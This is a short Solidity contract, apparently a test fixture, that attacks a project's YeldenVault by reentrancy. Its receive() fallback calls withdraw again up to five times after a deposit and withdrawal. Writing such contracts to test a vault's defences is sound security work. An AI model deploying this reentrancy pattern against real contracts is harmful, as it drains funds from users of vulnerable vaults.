// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../YeldenVault.sol";

contract Attacker {
    YeldenVault public vault;
    address public owner;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = YeldenVault(_vault);
        owner = msg.sender;
    }

    // Função para iniciar o ataque
    function attack(uint256 amount) external {
        require(msg.sender == owner, "So owner"); // Acento removido
        vault.deposit(amount, address(this));
        vault.withdraw(amount, address(this), address(this));
    }

    // Fallback chamado quando recebe ETH
    receive() external payable {
        attackCount++;
        if (attackCount < 5) {
            vault.withdraw(100, address(this), address(this));
        }
    }
}